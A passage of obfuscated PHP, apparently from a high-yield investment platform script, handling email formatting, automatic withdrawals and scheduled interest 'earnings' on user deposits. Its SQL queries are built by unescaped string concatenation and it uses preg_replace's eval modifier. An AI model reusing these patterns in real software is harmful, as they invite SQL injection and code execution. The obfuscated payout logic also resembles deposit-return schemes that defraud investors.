      $elnlcBhGT = fopen ($elnlcsyENS['elnlcUBfA'], $elnlcsyENS['elnlcAjMBJ']);
      fwrite ($elnlcBhGT, '' . 'TO: ' . $elnlcVdPU . '
From: ' . $elnlcQVmJ . '
Subject: ' . $elnlciFbpa . '

' . $elnlcLOyx . '

');
      fclose ($elnlcBhGT);
    }
    else
    {
      mail ($elnlcVdPU, $elnlciFbpa, $elnlcPoFxR, '' . 'From: ' . $elnlcQVmJ . '
Reply-To: ' . $elnlcQVmJ . ($elnlcCgqPK[$elnlcsyENS['elnlclURm']] ? '' . '
Content-Type: multipart/alternative; boundary=' . $elnlcgxPK : ''));
    }

  }

  function elnlcwhget ($elnlcEabU)
  {
    global $elnlcsyENS;
    $elnlcEabU = str_replace ('
', '
', $elnlcEabU);
    $elnlcEabU = str_replace ('
', '
', $elnlcEabU);
    return $elnlcEabU;
  }

  function elnlcipca ($elnlcEabU)
  {
    global $elnlcsyENS;
    $elnlcBHOxV = elnlcwhget ($elnlcEabU);
    if (substr ($elnlcBHOxV, 0 - strlen ('
')) != '
')
    {
      $elnlcBHOxV .= '
';
    }

    return $elnlcBHOxV;
  }

  function elnlcgqup ($elnlcEabU)
  {
    global $elnlcsyENS;
    $elnlcBHOxV = elnlcwhget ($elnlcEabU);
    if (substr ($elnlcBHOxV, 0 - strlen ('
')) != '
')
    {
      $elnlcBHOxV .= '
';
    }

    $elnlcBHOxV = preg_replace ('/([\\000-\\010\\013\\014\\016-\\037\\075\\177-\\377])/e', '\'=\'.sprintf(\'%02X\', ord(\'\\1\'))', $elnlcBHOxV);
    $elnlcBHOxV = preg_replace ('/([	 ])
/e', '\'=\'.sprintf(\'%02X\', ord(\'\\1\')).\'
\'', $elnlcBHOxV);
    $elnlcBHOxV = elnlcpzsr ($elnlcBHOxV, 74, true);
    return $elnlcBHOxV;
  }

  function elnlcpzsr ($elnlcrIMb, $elnlcvOap, $elnlcCtBKv = false)
  {
    global $elnlcsyENS;
    $elnlckeKj = ($elnlcCtBKv ? sprintf (' =%s', '
') : '
');
    $elnlcrIMb = elnlcwhget ($elnlcrIMb);
    if (substr ($elnlcrIMb, -1) == '
')
    {
      $elnlcrIMb = substr ($elnlcrIMb, 0, -1);
    }

    $elnlcflorp = explode ('
', $elnlcrIMb);
    $elnlcrIMb = '';
    for ($i = 0; $i < count ($elnlcflorp); ++$i)
    {
      $elnlcsPUg = explode (' ', $elnlcflorp[$i]);
      $elnlccktRA = '';
      for ($e = $elnlcsyENS['elnlcmjUx']; $e < count ($elnlcsPUg); ++$e)
      {
        $elnlcNnKmB = $elnlcsPUg[$e];
        if (($elnlcCtBKv AND $elnlcvOap < strlen ($elnlcNnKmB)))
        {
          $elnlckJaWv = $elnlcvOap - strlen ($elnlccktRA) - 1;
          if ($e != 0)
          {
            if (20 < $elnlckJaWv)
            {
              $elnlcAlyux = $elnlckJaWv;
              if (substr ($elnlcNnKmB, $elnlcAlyux - 1, 1) == '=')
              {
                --$elnlcAlyux;
              }
              else
              {
                if (substr ($elnlcNnKmB, $elnlcAlyux - 2, 1) == '=')
                {
                  $elnlcAlyux -= 2;
                }
              }

              $elnlcgjMk = substr ($elnlcNnKmB, 0, $elnlcAlyux);
              $elnlcNnKmB = substr ($elnlcNnKmB, $elnlcAlyux);
              $elnlccktRA .= ' ' . $elnlcgjMk;
              $elnlcrIMb .= $elnlccktRA . sprintf ('=%s', '
');
            }
            else
            {
              $elnlcrIMb .= $elnlccktRA . $elnlckeKj;
            }

            $elnlccktRA = '';
          }

          while (0 < strlen ($elnlcNnKmB))
          {
            $elnlcAlyux = $elnlcvOap;
            if (substr ($elnlcNnKmB, $elnlcAlyux - 1, 1) == '=')
            {
              --$elnlcAlyux;
            }
            else
            {
              if (substr ($elnlcNnKmB, $elnlcAlyux - 2, 1) == '=')
              {
                $elnlcAlyux -= 2;
              }
            }

            $elnlcgjMk = substr ($elnlcNnKmB, 0, $elnlcAlyux);
            $elnlcNnKmB = substr ($elnlcNnKmB, $elnlcAlyux);
            if (0 < strlen ($elnlcNnKmB))
            {
              $elnlcrIMb .= $elnlcgjMk . sprintf ('=%s', '
');
              continue;
            }
            else
            {
              $elnlccktRA = $elnlcgjMk;
              continue;
            }
          }

          continue;
        }

        $elnlcJmLA = $elnlccktRA;
        $elnlccktRA .= ($e == 0 ? $elnlcNnKmB : ' ' . $elnlcNnKmB);
        if (($elnlcvOap < strlen ($elnlccktRA) AND $elnlcJmLA != ''))
        {
          $elnlcrIMb .= $elnlcJmLA . $elnlckeKj;
          $elnlccktRA = $elnlcNnKmB;
          continue;
        }
      }

      $elnlcrIMb .= $elnlccktRA . '
';
    }

    return $elnlcrIMb;
  }

  function elnlcdppod ($elnlcIUUJq = '100%')
  {
    return '' . '
<table cellspacing=0 cellpadding=1 border=0 width=' . $elnlcIUUJq . ' bgcolor=#FF8D00>
<tr><td bgcolor=#FF8D00>
<table cellspacing=0 cellpadding=0 border=0 width=100%>
<tr>
<td valign=top width=10 bgcolor=#FFFFF2><img src=images/sign.gif></td>
<td valign=top bgcolor=#FFFFF2 style=\'padding: 10px; color: #D20202; font-family: verdana; font-size: 11px;\'>
';
  }

  function elnlcsehc ()
  {
    return '</td></tr></table></td></tr></table>';
  }

  function elnlcokeap ($elnlcOMIk, $elnlcrUqv, $elnlcLluj)
  {
    global $elnlcsyENS;
    global $elnlcSuVc;
    if ($elnlcSuVc[$elnlcsyENS['elnlciwSzJ']] == 1)
    {
      return null;
    }

    if ($elnlcSuVc[$elnlcsyENS['elnlcdUfHE']] == 1)
    {
      $q = '' . 'select * from hm2_deposits where id = ' . $elnlcOMIk;
      ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
      $elnlcfIAy = mysql_fetch_array ($elnlchGkPU);
      if (!$elnlcGPfS[$elnlcfIAy[$elnlcsyENS['elnlcyqyS']]][$elnlcsyENS['elnlcaEnQa']])
      {
        return null;
      }

      $q = 'select * from hm2_users where id = ' . $elnlcfIAy[$elnlcsyENS['elnlcAvUq']];
      ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
      $elnlcKCjH = mysql_fetch_array ($elnlchGkPU);
      if (($elnlcKCjH[$elnlcsyENS['elnlcdkwSQ']] != 1 OR $elnlcKCjH[$elnlcsyENS['elnlcfLWC']] != 1))
      {
        return null;
      }

      if (0 < $elnlcSuVc[$elnlcsyENS['elnlcbCkm']])
      {
        $q = 'select sum(actual_amount*(type = \'add_funds\')) as td, sum(actual_amount*(type = \'withdrawal\')) as tw from hm2_history where type in (\'add_funds\', \'withdrawal\')';
        ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
        $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
        if (0 < $elnlcCgqPK[$elnlcsyENS['elnlcWhRAL']])
        {
          if ($elnlcSuVc[$elnlcsyENS['elnlcbCkm']] <= ($elnlcCgqPK[$elnlcsyENS['elnlctgvUa']] + $elnlcrUqv) * 100 / $elnlcCgqPK[$elnlcsyENS['elnlcWhRAL']])
          {
            return null;
          }
        }
      }

      $elnlcjpFA = unserialize ($elnlcKCjH[$elnlcsyENS['elnlcEoNu']]);
      $elnlcrUqv = abs ($elnlcrUqv);
      $elnlcKtjJ = floor ($elnlcrUqv * $elnlcSuVc[$elnlcsyENS['elnlcvWUU']]) / 100;
      if ($elnlcKtjJ < $elnlcSuVc[$elnlcsyENS['elnlcoWDns']])
      {
        $elnlcKtjJ = $elnlcSuVc[$elnlcsyENS['elnlcoWDns']];
      }

      $elnlcElMWd = $elnlcrUqv - $elnlcKtjJ;
      if ($elnlcElMWd < 0)
      {
        $elnlcElMWd = $elnlcsyENS['elnlcmjUx'];
      }

      $elnlcElMWd = sprintf ('%.02f', floor ($elnlcElMWd * 100) / 100);
      if ($elnlcSuVc[$elnlcsyENS['elnlcpjhxj']] != '')
      {
        $elnlcRKqKz = '' . 'Earning from deposit $' . $elnlcfIAy[$elnlcsyENS['elnlcAwVw']] . '. Auto withdraw to ' . $elnlcKCjH[$elnlcsyENS['elnlczWew']] . ' from ' . $elnlcSuVc[$elnlcsyENS['elnlcIEsb']];
      }
      else
      {
        $elnlcRKqKz = $elnlcSuVc[$elnlcsyENS['elnlcpjhxj']];
      }

      $elnlcRWgpq = '' . 'Auto-withdrawal error, tried to send ' . $elnlcElMWd . ' earning to ' . $elnlcGPfS[$elnlcfIAy[$elnlcsyENS['elnlcyqyS']]][$elnlcsyENS['elnlcmjdk']] . ' account # ' . $elnlcjpFA[$elnlcfIAy[$elnlcsyENS['elnlcyqyS']]] . '. Error:';
      if ($elnlcfIAy[$elnlcsyENS['elnlcyqyS']] == 0)
      {
        list ($elnlcqbku, $elnlcLOyx, $elnlcVTlA) = elnlctvanm ('', $elnlcElMWd, $elnlcjpFA[$elnlcfIAy[$elnlcsyENS['elnlcyqyS']]], $elnlcRKqKz, $elnlcRWgpq);
      }

      if ($elnlcfIAy[$elnlcsyENS['elnlcyqyS']] == 1)
      {
        list ($elnlcqbku, $elnlcLOyx, $elnlcVTlA) = elnlcmatra ('', $elnlcElMWd, $elnlcjpFA[$elnlcfIAy[$elnlcsyENS['elnlcyqyS']]], $elnlcRKqKz, $elnlcRWgpq);
      }

      if ($elnlcfIAy[$elnlcsyENS['elnlcyqyS']] == 2)
      {
        list ($elnlcqbku, $elnlcLOyx, $elnlcVTlA) = elnlcfvxzr ('', $elnlcElMWd, $elnlcjpFA[$elnlcfIAy[$elnlcsyENS['elnlcyqyS']]], $elnlcRKqKz, $elnlcRWgpq);
      }

      if ($elnlcfIAy[$elnlcsyENS['elnlcyqyS']] == 5)
      {
        list ($elnlcqbku, $elnlcLOyx, $elnlcVTlA) = elnlcqwlb ('', $elnlcElMWd, $elnlcjpFA[$elnlcfIAy[$elnlcsyENS['elnlcyqyS']]], $elnlcRKqKz, $elnlcRWgpq);
      }

      if ($elnlcfIAy[$elnlcsyENS['elnlcyqyS']] == 8)
      {
        list ($elnlcqbku, $elnlcLOyx, $elnlcVTlA) = elnlcuuenw ('', $elnlcElMWd, $elnlcjpFA[$elnlcfIAy[$elnlcsyENS['elnlcyqyS']]], $elnlcRKqKz, $elnlcRWgpq);
      }

      if ($elnlcfIAy[$elnlcsyENS['elnlcyqyS']] == 9)
      {
        list ($elnlcqbku, $elnlcLOyx, $elnlcVTlA) = elnlcdaov ('', $elnlcElMWd, $elnlcjpFA[$elnlcfIAy[$elnlcsyENS['elnlcyqyS']]], $elnlcRKqKz, $elnlcRWgpq);
      }

      if ($elnlcfIAy[$elnlcsyENS['elnlcyqyS']] == 15)
      {
        list ($elnlcqbku, $elnlcLOyx, $elnlcVTlA) = elnlcdjefm ('', $elnlcElMWd, $elnlcjpFA[$elnlcfIAy[$elnlcsyENS['elnlcyqyS']]], $elnlcRKqKz, $elnlcRWgpq);
      }

      if ($elnlcfIAy[$elnlcsyENS['elnlcyqyS']] == 16)
      {
        list ($elnlcqbku, $elnlcLOyx, $elnlcVTlA) = elnlcpvgl ('', $elnlcElMWd, $elnlcjpFA[$elnlcfIAy[$elnlcsyENS['elnlcyqyS']]], $elnlcRKqKz, $elnlcRWgpq);
      }

      if ($elnlcfIAy[$elnlcsyENS['elnlcyqyS']] == 17)
      {
        list ($elnlcqbku, $elnlcLOyx, $elnlcVTlA) = elnlcelbi ('', $elnlcElMWd, $elnlcjpFA[$elnlcfIAy[$elnlcsyENS['elnlcyqyS']]], $elnlcRKqKz, $elnlcRWgpq);
      }

      if ($elnlcfIAy[$elnlcsyENS['elnlcyqyS']] == 18)
      {
        list ($elnlcqbku, $elnlcLOyx, $elnlcVTlA) = elnlcbvtd ('', $elnlcElMWd, $elnlcjpFA[$elnlcfIAy[$elnlcsyENS['elnlcyqyS']]], $elnlcRKqKz, $elnlcRWgpq);
      }

      if ($elnlcfIAy[$elnlcsyENS['elnlcyqyS']] == 24)
      {
        list ($elnlcqbku, $elnlcLOyx, $elnlcVTlA) = elnlcewesn ('', $elnlcElMWd, $elnlcjpFA[$elnlcfIAy[$elnlcsyENS['elnlcyqyS']]], $elnlcRKqKz, $elnlcRWgpq);
      }

      if ($elnlcqbku == 1)
      {
        $q = 'insert into hm2_history set
            user_id = ' . $elnlcKCjH[$elnlcsyENS['elnlcLbvLL']] . ('' . ',
        		amount = -' . $elnlcrUqv . ',
            		actual_amount = -' . $elnlcrUqv . ',
        		type=\'withdrawal\',
            		' . $elnlcLluj . ',
			ec = ') . $elnlcfIAy[$elnlcsyENS['elnlcyqyS']] . ',
        		description = \'Auto-withdrawal earning to account ' . $elnlcjpFA[$elnlcfIAy[$elnlcsyENS['elnlcyqyS']]] . ('' . '. Batch is ' . $elnlcVTlA . '\'');
        (mysql_query ($q) OR print mysql_error ());
        $elnlcRuFoK = array ();
        $elnlcRuFoK[$elnlcsyENS['elnlczWew']] = $elnlcKCjH[$elnlcsyENS['elnlczWew']];
        $elnlcRuFoK[$elnlcsyENS['elnlcmjdk']] = $elnlcKCjH[$elnlcsyENS['elnlcmjdk']];
        $elnlcRuFoK[$elnlcsyENS['elnlcyteO']] = $elnlcrUqv;
        $elnlcRuFoK[$elnlcsyENS['elnlcwuPu']] = $elnlcVTlA;
        $elnlcRuFoK[$elnlcsyENS['elnlcJdSMq']] = $elnlcjpFA[$elnlcfIAy[$elnlcsyENS['elnlcyqyS']]];
        $elnlcRuFoK[$elnlcsyENS['elnlccefl']] = $elnlcGPfS[$elnlcfIAy[$elnlcsyENS['elnlcyqyS']]][$elnlcsyENS['elnlcmjdk']];
        elnlcsius ('withdraw_user_notification', $elnlcKCjH[$elnlcsyENS['elnlcdktEr']], $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcRuFoK);
        elnlcsius ('withdraw_admin_notification', $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcRuFoK);
      }
    }

  }

  function elnlcikppd ($elnlcHmVi)
  {
    global $elnlcsyENS;
    global $elnlcSuVc;
    $elnlcWBLE = array ();
    if (($elnlcSuVc[$elnlcsyENS['elnlcmPmuG']] == 1 AND $elnlcHmVi != -2))
    {
      return null;
    }

    $q = 'select hm2_plans.* from hm2_plans, hm2_types where hm2_types.status = \'on\' and hm2_types.id = hm2_plans.parent order by parent, min_deposit';
    ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
    {
      $elnlcWBLE[$elnlcCgqPK[$elnlcsyENS['elnlcbViuH']]][$elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']]] = $elnlcCgqPK;
    }

    $elnlclOSA = $elnlcsyENS['elnlctNxTK'];
    $elnlconLWC = 'u.last_access_time + interval 30 minute < now() ';
    if ($elnlcHmVi == -1)
    {
      $elnlconLWC = '1 = 1';
      $q = 'select * from hm2_users where l_e_t + interval 15 minute < now() and status = \'on\'';
    }
    else
    {
      $q = '' . 'select * from hm2_users where id = ' . $elnlcHmVi . ' and status = \'on\'';
    }

    if ($elnlcHmVi == -2)
    {
      $q = 'select * from hm2_users where status = \'on\'';
      $q = 'select distinct user_id as id from hm2_deposits where to_days(last_pay_date) < to_days(now()) order by user_id';
    }

    ($elnlckfIs = mysql_query ($q) OR print mysql_error ());
    while ($elnlcCKDFD = mysql_fetch_array ($elnlckfIs))
    {
      $elnlcTVzDu = $elnlcCKDFD[$elnlcsyENS['elnlcLbvLL']];
      $q = '' . 'update hm2_users set l_e_t = now() where id = ' . $elnlcTVzDu;
      (mysql_query ($q) OR print mysql_error ());
      $elnlclOSA = $elnlcsyENS['elnlctNxTK'];
      $elnlcCSauH = ' ((t.work_week = 1)*(floor(q_days / 5) * 7 + q_days % 5 + ((q_days % 5 + WEEKDAY(deposit_date)) > 5)*2 - 1) + (t.work_week = 0)*(t.q_days)) ';
      while (0 < $elnlclOSA)
      {
        $q = '' . 'select 
              d.*, 
              t.period as period, t.use_compound as use_compound,
              t.compound_min_deposit, t.compound_max_deposit,
              t.compound_min_percent, t.compound_max_percent,
              t.compound_percents_type, t.compound_percents,
              t.work_week as work_week,
              t.q_days as q_days, t.withdraw_principal,
              (d.deposit_date + interval t.withdraw_principal_duration day < now()) wp_ok,
              t.return_profit as return_profit,
              ' . $elnlcCSauH . ' as q_days1
            from
              hm2_deposits as d,
              hm2_types as t,
              hm2_users as u
            where 
              u.id = ' . $elnlcTVzDu . ' and 
              u.status = \'on\' and 
              d.status=\'on\' and 
              d.type_id = t.id and 
              t.status = \'on\' and 
              u.id = d.user_id and
              (((' . $elnlcCSauH . ' + t.delay - 1*(t.delay > 0)) > ((UNIX_TIMESTAMP(d.last_pay_date) - UNIX_TIMESTAMP(d.deposit_date)) / if(t.period = \'h\', 60*60, 60*60*24))) or ' . $elnlcCSauH . ' = 0) and 
              (
                (d.last_pay_date + interval 1 hour <= now() and t.period = \'h\')or
                (d.last_pay_date + interval 1 day <= now() and t.period = \'d\')or
                (d.last_pay_date + interval 7 day <= now() and t.period = \'w\') or
                (d.last_pay_date + interval 14 day <= now() and t.period = \'b-w\') or
                (d.last_pay_date + interval 1 month <= now() and t.period = \'m\') or
                (d.last_pay_date + interval 2 month <= now() and t.period = \'2m\') or
                (d.last_pay_date + interval 3 month <= now() and t.period = \'3m\') or
                (d.last_pay_date + interval 6 month <= now() and t.period = \'6m\') or
                (d.last_pay_date + interval 1 year <= now() and t.period = \'y\') or
                (d.deposit_date + interval ' . $elnlcCSauH . ' + t.delay-1*(t.delay > 0) day <= now() and t.period = \'end\') 
              ) and
              ((' . $elnlcCSauH . ' = 0) or 
                (               
                (d.deposit_date + interval ' . $elnlcCSauH . ' + t.delay-1*(t.delay > 0) hour >= d.last_pay_date and t.period = \'h\') or
                (d.deposit_date + interval ' . $elnlcCSauH . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date and t.period = \'d\') or
                (d.deposit_date + interval ' . $elnlcCSauH . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 7 day and t.period = \'w\') or
                (d.deposit_date + interval ' . $elnlcCSauH . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 14 day  and t.period = \'b-w\') or
                (d.deposit_date + interval ' . $elnlcCSauH . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 month  and t.period = \'m\') or
                (d.deposit_date + interval ' . $elnlcCSauH . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 2 month  and t.period = \'2m\') or
                (d.deposit_date + interval ' . $elnlcCSauH . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 3 month  and t.period = \'3m\') or
                (d.deposit_date + interval ' . $elnlcCSauH . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 6 month  and t.period = \'6m\') or
                (d.deposit_date + interval ' . $elnlcCSauH . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 year and t.period = \'y\') or
                (' . $elnlcCSauH . ' > 0 and t.period = \'end\') 
              ))';
        ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
        $elnlclOSA = $elnlcsyENS['elnlcmjUx'];
        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
        {
          ++$elnlclOSA;
          if (!isset ($elnlcWBLE[$elnlcCgqPK[$elnlcsyENS['elnlcPfzD']]]))
          {
            continue;
          }

          $elnlcTjnV = $elnlcsyENS['elnlcmjUx'];
          $elnlcyvqy = $elnlcsyENS['elnlcmjUx'];
          reset ($elnlcWBLE);
          reset ($elnlcWBLE[$elnlcCgqPK[$elnlcsyENS['elnlcPfzD']]]);
          while (list ($elnlcxHGyw, $elnlcRdog) = each ($elnlcWBLE[$elnlcCgqPK[$elnlcsyENS['elnlcPfzD']]]))
          {
            if (($elnlcRdog[$elnlcsyENS['elnlcwFTQ']] <= $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] AND ($elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] <= $elnlcRdog[$elnlcsyENS['elnlcMFyGk']] OR $elnlcRdog[$elnlcsyENS['elnlcMFyGk']] == 0)))
            {
              $elnlcTjnV = $elnlcRdog[$elnlcsyENS['elnlcOhvjC']];
            }

            if (($elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] < $elnlcRdog[$elnlcsyENS['elnlcwFTQ']] AND $elnlcTjnV == 0))
            {
              $elnlcTjnV = $elnlcyvqy;
            }

            if (($elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] < $elnlcRdog[$elnlcsyENS['elnlcwFTQ']] AND 0 < $elnlcTjnV))
            {
              break;
            }

            $elnlcyvqy = $elnlcRdog[$elnlcsyENS['elnlcOhvjC']];
          }

          if (($elnlcRdog[$elnlcsyENS['elnlcMFyGk']] != 0 AND $elnlcRdog[$elnlcsyENS['elnlcMFyGk']] < $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']]))
          {
            $elnlcTjnV = $elnlcyvqy;
          }

          $elnlcGGMmt = $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] * $elnlcTjnV / 100;
          $elnlcJwrG = '';
          if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcaeKEf'])
          {
            $elnlcJwrG = ' 1 day ';
          }
          else
          {
            if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcQcSG'])
            {
              $elnlcJwrG = ' 1 hour ';
            }
            else
            {
              if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcwGlL'])
              {
                $elnlcJwrG = ' 7 day ';
              }
              else
              {
                if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == 'b-w')
                {
                  $elnlcJwrG = ' 14 day ';
                }
                else
                {
                  if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcGPcC'])
                  {
                    $elnlcJwrG = ' 1 month ';
                  }
                  else
                  {
                    if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlczdyU'])
                    {
                      $elnlcJwrG = ' 2 month ';
                    }
                    else
                    {
                      if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlczdOP'])
                      {
                        $elnlcJwrG = ' 3 month ';
                      }
                      else
                      {
                        if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcwbAEV'])
                        {
                          $elnlcJwrG = ' 6 month ';
                        }
                        else
                        {
                          if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcclPO'])
                          {
                            $elnlcJwrG = ' 1 year ';
                          }
                          else
                          {
                            if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcBEDou'])
                            {
                              $elnlcJwrG = ' ' . $elnlcCgqPK[$elnlcsyENS['elnlcJSvGA']] . ' day ';
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }

          if (($elnlcTjnV == 0 AND $elnlcJwrG == ''))
          {
            continue;
          }

          $elnlcOWWAf = -1;
          $q = 'select weekday(\'' . $elnlcCgqPK[$elnlcsyENS['elnlctKJt']] . ('' . '\' + interval ' . $elnlcJwrG . ') as dw');
          ($elnlcSrlye = mysql_query ($q) OR print mysql_error ());
          while ($elnlcggjo = mysql_fetch_array ($elnlcSrlye))
          {
            $elnlcOWWAf = $elnlcggjo[$elnlcsyENS['elnlccblu']];
          }

          $q = 'select count(id) as col from hm2_history where ' . ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcQcSG'] ? ' date_format(date, \'%Y-%m-%d %H\') = date_format(\'' . $elnlcCgqPK[$elnlcsyENS['elnlctKJt']] . ('' . '\' + interval ' . $elnlcJwrG . ', \'%Y-%m-%d %H\') and') : 'to_days(date) = to_days(\'' . $elnlcCgqPK[$elnlcsyENS['elnlctKJt']] . ('' . '\' + interval ' . $elnlcJwrG . ') and ')) . ' deposit_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
          ($elnlcqTHnf = mysql_query ($q) OR print mysql_error ());
          $elnlciliCo = $elnlcsyENS['elnlcmjUx'];
          while ($elnlcngDEl = mysql_fetch_array ($elnlcqTHnf))
          {
            $elnlciliCo = $elnlcngDEl[$elnlcsyENS['elnlckNCf']];
          }

          if ($elnlciliCo == 0)
          {
            if ((5 <= $elnlcOWWAf AND $elnlcCgqPK[$elnlcsyENS['elnlcqCEH']] == 1))
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAvUq']] . ',
                    amount = 0,
                    type = \'earning\',
                    description = \'No interest on ' . ($elnlcOWWAf == 5 ? 'Saturday' : 'Sunday') . '\',
                    actual_amount = 0,
                    date = \'' . $elnlcCgqPK[$elnlcsyENS['elnlctKJt']] . ('' . '\' + interval ' . $elnlcJwrG . ',
                    ec = ') . $elnlcCgqPK[$elnlcsyENS['elnlcyqyS']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
            }
            else
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAvUq']] . ('' . ',
                    amount = ' . $elnlcGGMmt . ',
                    type = \'earning\',
                    description = \'Earning from deposit ') . $elnlcSuVc[$elnlcsyENS['elnlcypSu']] . number_format ($elnlcCgqPK[$elnlcsyENS['elnlcAwVw']], 2) . ('' . ' - ' . $elnlcTjnV . ' %\',
                    actual_amount = ' . $elnlcGGMmt . ',
                    date = \'') . $elnlcCgqPK[$elnlcsyENS['elnlctKJt']] . ('' . '\' + interval ' . $elnlcJwrG . ',
                    ec = ') . $elnlcCgqPK[$elnlcsyENS['elnlcyqyS']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
            }

            (mysql_query ($q) OR print mysql_error ());
          }

          $elnlcRIyyJ = '';
          if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcBEDou'])
          {
            if (($elnlcCgqPK[$elnlcsyENS['elnlcIUuj']] == 0 OR ($elnlcCgqPK[$elnlcsyENS['elnlcIUuj']] AND $elnlcCgqPK[$elnlcsyENS['elnlccNEL']])))
            {
              $elnlcRIyyJ = ', status = \'off\'';
            }

            if (($elnlcCgqPK[$elnlcsyENS['elnlcRupg']] == 1 AND ($elnlcCgqPK[$elnlcsyENS['elnlcIUuj']] == 0 OR ($elnlcCgqPK[$elnlcsyENS['elnlcIUuj']] AND $elnlcCgqPK[$elnlcsyENS['elnlccNEL']]))))
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAvUq']] . ',
                    amount = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] . ',
                    type=\'release_deposit\',
                    actual_amount = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] . ',
                    ec = ' . $elnlcCgqPK[$elnlcsyENS['elnlcyqyS']] . ',
                    date = \'' . $elnlcCgqPK[$elnlcsyENS['elnlctKJt']] . ('' . '\' + interval ' . $elnlcJwrG . ',
                    deposit_id = ') . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
              (mysql_query ($q) OR print mysql_error ());
            }
          }
          else
          {
            if ((5 <= $elnlcOWWAf AND $elnlcCgqPK[$elnlcsyENS['elnlcqCEH']] == 1))
            {
            }
            else
            {
              if (((0 < $elnlcCgqPK[$elnlcsyENS['elnlccdExO']] AND $elnlcCgqPK[$elnlcsyENS['elnlccdExO']] <= 100) AND $elnlcCgqPK[$elnlcsyENS['elnlcvNkQ']] == 1))
              {
                if ($elnlcCgqPK[$elnlcsyENS['elnlcdzAd']] == 0)
                {
                  $elnlcCgqPK[$elnlcsyENS['elnlcdzAd']] = $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] + 1;
                }

                if (($elnlcCgqPK[$elnlcsyENS['elnlcqQISr']] <= $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] AND $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] <= $elnlcCgqPK[$elnlcsyENS['elnlcdzAd']]))
                {
                  if ($elnlcCgqPK[$elnlcsyENS['elnlcDxJb']] == 1)
                  {
                    $elnlcnGUUn = preg_split ('/\\s*,\\s*/', $elnlcCgqPK[$elnlcsyENS['elnlcDexfh']]);
                    if (!in_array ($elnlcCgqPK[$elnlcsyENS['elnlccdExO']], $elnlcnGUUn))
                    {
                      $elnlcCgqPK[$elnlcsyENS['elnlccdExO']] = $elnlcnGUUn[0];
                    }
                  }
                  else
                  {
                    if ($elnlcCgqPK[$elnlcsyENS['elnlccdExO']] < $elnlcCgqPK[$elnlcsyENS['elnlcORJuw']])
                    {
                      $elnlcCgqPK[$elnlcsyENS['elnlccdExO']] = $elnlcCgqPK[$elnlcsyENS['elnlcORJuw']];
                    }

                    if ($elnlcCgqPK[$elnlcsyENS['elnlcyDBs']] < $elnlcCgqPK[$elnlcsyENS['elnlccdExO']])
                    {
                      $elnlcCgqPK[$elnlcsyENS['elnlccdExO']] = $elnlcCgqPK[$elnlcsyENS['elnlcyDBs']];
                    }
                  }
                }
                else
                {
                  $elnlcCgqPK[$elnlcsyENS['elnlccdExO']] = $elnlcsyENS['elnlcmjUx'];
                }

                if ((0 < $elnlcCgqPK[$elnlcsyENS['elnlccdExO']] AND $elnlcCgqPK[$elnlcsyENS['elnlccdExO']] <= 100))
                {
                  $elnlczCfN = $elnlcGGMmt * $elnlcCgqPK[$elnlcsyENS['elnlccdExO']] / 100;
                  $elnlcGGMmt = floor ((floor ($elnlcGGMmt * 100000) / 100000 - floor ($elnlczCfN * 100000) / 100000) * 100) / 100;
